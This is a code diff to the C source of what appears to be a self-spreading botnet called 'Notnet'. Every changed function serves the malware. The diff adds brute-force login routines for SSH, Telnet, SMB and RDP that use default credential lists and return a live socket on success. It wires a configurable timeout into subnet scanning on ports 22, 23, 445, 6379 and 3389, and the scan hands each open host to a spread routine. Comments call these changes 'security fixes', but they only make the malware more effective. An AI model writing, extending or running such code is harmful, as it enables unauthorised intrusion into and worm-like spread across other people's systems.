@@ -194,15 +194,117 @@ int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *p
     return -1;
 }
 
+/* Timeout-aware SSH login — uses provided timeout_ms instead of SCAN_TIMEOUT_MS.
+ * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
+int try_login_ssh_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
+    int sock = create_connection(ip, port, timeout_ms);
+    if (sock < 0) return -1;
+
+    /* Read banner */
+    char banner[256];
+    fd_set fds;
+    struct timeval tv;
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 1;
+    tv.tv_usec = 0;
+
+    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+        recv(sock, banner, sizeof(banner) - 1, 0);
+        banner[sizeof(banner) - 1] = '\0';
+    }
+
+    /* Check for SSH-2 banner (more secure than SSH-1) */
+    if (strstr(banner, "SSH-2") == NULL) {
+        close(sock);
+        return -1;
+    }
+
+    /* Send SSH banner */
+    char our_banner[256];
+    snprintf(our_banner, sizeof(our_banner), "SSH-2.0-Notnet\r\n");
+    send(sock, our_banner, strlen(our_banner), 0);
+
+    /* Read server banner or prompt */
+    char resp[256];
+    memset(resp, 0, sizeof(resp));
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 1;
+    tv.tv_usec = 0;
+    select(sock + 1, &fds, NULL, NULL, &tv);
+    recv(sock, resp, sizeof(resp) - 1, 0);
+
+    /* Send username */
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
+    send(sock, cmd, strlen(cmd), 0);
+
+    /* Read password prompt */
+    memset(resp, 0, sizeof(resp));
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 1;
+    tv.tv_usec = 0;
+    select(sock + 1, &fds, NULL, NULL, &tv);
+    recv(sock, resp, sizeof(resp) - 1, 0);
+
+    /* Send password */
+    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
+    send(sock, cmd, strlen(cmd), 0);
+
+    /* Read response */
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 2;
+    tv.tv_usec = 0;
+
+    int success = 0;
+    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+        memset(resp, 0, sizeof(resp));
+        recv(sock, resp, sizeof(resp) - 1, 0);
+        resp[sizeof(resp) - 1] = '\0';
+        /* Check for successful login indicators */
+        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "Welcome")) {
+            success = 1;
+        }
+    }
+
+    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
+    if (success) return sock;
+    close(sock);
+    return -1;
+}
+
+int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
+int try_login_smb_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
+int try_login_rdp_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
+int scan_port_with_timeout(const char *ip, uint16_t port, int timeout_ms);
+char *scan_ports(const char *target, uint16_t *ports, int port_count);
+
+/* Forward declarations for static functions defined later */
+static int smb1_negotiate(int sock);
+static int smb1_session_setup(int sock, const char *user, const char *pass, uint16_t *out_uid);
+static int rdp_connect(int sock);
+static int rdp_send_cred_key_exchange(int sock, const char *user, const char *pass);
+static int rdp_read_cred_response(int sock);
+static int rdp_send_final_control(int sock);
+static int rdp_read_final_control_response(int sock);
+static int rdp_send_share_key(int sock);
+
 int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
     if (!bot->ssh_enabled) return -1;
     
     log_info("SSH: brute-forcing %s:%d", ip, port);
     
+    /* Use config timeout, fall back to compile-time default */
+    int timeout = SCAN_TIMEOUT_MS;
+    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;
+
     /* Try default credentials */
     for (int u = 0; default_users[u]; u++) {
         for (int p = 0; default_passes[p]; p++) {
-            int sock_fd = try_login_ssh(ip, port, default_users[u], default_passes[p]);
+            int sock_fd = try_login_ssh_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
             if (sock_fd >= 0) {
                 log_info("SSH: cracked %s:%d with %s:%s",
                          ip, port, default_users[u], "***REDACTED***");
@@ -291,14 +393,156 @@ int try_login_telnet(const char *ip, uint16_t port, const char *user, const char
     return -1;
 }
 
+/* Timeout-aware telnet login — uses provided timeout_ms.
+ * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
+int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
+    int sock = create_connection(ip, port, timeout_ms);
+    if (sock < 0) return -1;
+
+    char banner[256];
+    fd_set fds;
+    struct timeval tv;
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 1;
+    tv.tv_usec = 0;
+
+    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+        recv(sock, banner, sizeof(banner) - 1, 0);
+    }
+
+    /* Send username */
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
+    send(sock, cmd, strlen(cmd), 0);
+
+    /* Read prompt */
+    char resp[256];
+    memset(resp, 0, sizeof(resp));
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 2;
+    tv.tv_usec = 0;
+
+    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+        memset(resp, 0, sizeof(resp));
+        recv(sock, resp, sizeof(resp) - 1, 0);
+    }
+
+    /* Send password */
+    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
+    send(sock, cmd, strlen(cmd), 0);
+
+    /* Read response */
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 2;
+    tv.tv_usec = 0;
+
+    int success = 0;
+    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
+        memset(resp, 0, sizeof(resp));
+        recv(sock, resp, sizeof(resp) - 1, 0);
+        resp[sizeof(resp) - 1] = '\0';
+        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "OK")) {
+            success = 1;
+        }
+    }
+
+    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
+    if (success) return sock;
+    close(sock);
+    return -1;
+}
+
+/* Timeout-aware SMB login — uses provided timeout_ms.
+ * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
+int try_login_smb_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
+    int sock = create_connection(ip, port, timeout_ms);
+    if (sock < 0) return -1;
+
+    /* SMB1 negotiation */
+    if (smb1_negotiate(sock) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    /* Session setup with credentials */
+    uint16_t uid = 0;
+    if (smb1_session_setup(sock, user, pass, &uid) != 0) {
+        close(sock);
+        return -1;
+    }
+
+    log_info("SMB: session established as uid=%d", uid);
+    return sock;
+}
+
+/* Timeout-aware RDP login — uses provided timeout_ms.
+ * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
+int try_login_rdp_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
+    int sock = create_connection(ip, port, timeout_ms);
+    if (sock < 0) return -1;
+
+    /* Full RDP handshake */
+    if (rdp_connect(sock) != 0) {
+        close(sock);
+        return -1;
+    }
+
+    /* Send credentials with key exchange */
+    if (rdp_send_cred_key_exchange(sock, user, pass) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    /* Read auth response */
+    if (rdp_read_cred_response(sock) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    /* Final control */
+    if (rdp_send_final_control(sock) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    if (rdp_read_final_control_response(sock) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    /* Share key */
+    rdp_send_share_key(sock);
+
+    log_info("RDP: authenticated to %s:%d as %s", ip, port, user);
+    return sock;
+}
+
+/* Timeout-aware port scan — uses provided timeout_ms.
+ * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
+int scan_port_with_timeout(const char *ip, uint16_t port, int timeout_ms) {
+    int sock = create_connection(ip, port, timeout_ms);
+    if (sock < 0) return -1;
+
+    close(sock);
+
+    return 0;
+}
+
 int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
     if (!bot->telnet_enabled) return -1;
-    
+
     log_info("Telnet: brute-forcing %s:%d", ip, port);
-    
+
+    /* Use config timeout, fall back to compile-time default */
+    int timeout = SCAN_TIMEOUT_MS;
+    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;
+
     for (int u = 0; default_users[u]; u++) {
         for (int p = 0; default_passes[p]; p++) {
-            int sock_fd = try_login_telnet(ip, port, default_users[u], default_passes[p]);
+            int sock_fd = try_login_telnet_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
             if (sock_fd >= 0) {
                 log_info("Telnet: cracked %s:%d with %s:%s",
                          ip, port, default_users[u], "***REDACTED***");
@@ -381,9 +625,11 @@ static int smb1_transaction(int sock, uint8_t *params, int param_len,
 
     /* Send */
     int sent = send(sock, packet, total, 0);
+    if (sent <= 0) {
+        free(packet);
+        return -1;
+    }
     free(packet);
-
-    if (sent <= 0) return -1;
 
     /* Read response header first (4 bytes prefix + at least 32 header) */
     int received = recv(sock, resp_buf, 4, 0);
@@ -715,9 +961,13 @@ int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
 
     log_info("SMB: brute-forcing %s:%d", ip, port);
 
+    /* Use config timeout, fall back to compile-time default */
+    int timeout = SCAN_TIMEOUT_MS;
+    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;
+
     for (int u = 0; default_users[u]; u++) {
         for (int p = 0; default_passes[p]; p++) {
-            int sock = try_login_smb(ip, port, default_users[u], default_passes[p]);
+            int sock = try_login_smb_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
             if (sock < 0) continue;
 
             log_info("SMB: cracked %s:%d with %s:%s",
@@ -1402,9 +1652,13 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
 
     log_info("RDP: brute-forcing %s:%d", ip, port);
 
+    /* Use config timeout, fall back to compile-time default */
+    int timeout = SCAN_TIMEOUT_MS;
+    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;
+
     for (int u = 0; default_users[u]; u++) {
         for (int p = 0; default_passes[p]; p++) {
-            int sock = try_login_rdp(ip, port, default_users[u], default_passes[p]);
+            int sock = try_login_rdp_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
             if (sock < 0) continue;
 
             log_info("RDP: cracked %s:%d with %s:%s",
@@ -1518,19 +1772,19 @@ int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
         
         /* Scan target services based on mask */
         if (service_mask & SPREAD_SSH) {
-            scan_port(bot, ip_str, 22);
+            scan_port_with_timeout(ip_str, 22, timeout);
         }
         if (service_mask & SPREAD_TELNET) {
-            scan_port(bot, ip_str, 23);
+            scan_port_with_timeout(ip_str, 23, timeout);
         }
         if (service_mask & SPREAD_SMB) {
-            scan_port(bot, ip_str, 445);
+            scan_port_with_timeout(ip_str, 445, timeout);
         }
         if (service_mask & SPREAD_REDIS) {
-            scan_port(bot, ip_str, 6379);
+            scan_port_with_timeout(ip_str, 6379, timeout);
         }
         if (service_mask & SPREAD_RDP) {
-            scan_port(bot, ip_str, 3389);
+            scan_port_with_timeout(ip_str, 3389, timeout);
         }
     }
     
@@ -1538,16 +1792,14 @@ int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
 }
 
 int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port) {
-    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
-    if (sock < 0) return -1;
-    
-    close(sock);
-    
+    int timeout = SCAN_TIMEOUT_MS;
+    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;
+    if (scan_port_with_timeout(ip, port, timeout) != 0) return -1;
+
     /* Port is open */
     bot->scan_count++;
-
     log_info("port open: %s:%d", ip, port);
-    
+
     /* Spread to this port */
     switch (port) {
         case 22:  spread_ssh(bot, ip, port); break;
@@ -1556,7 +1808,7 @@ int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port) {
         case 6379: spread_redis(bot, ip, port); break;
         case 3389: spread_rdp(bot, ip, port); break;
     }
-    
+
     return 0;
 }
 
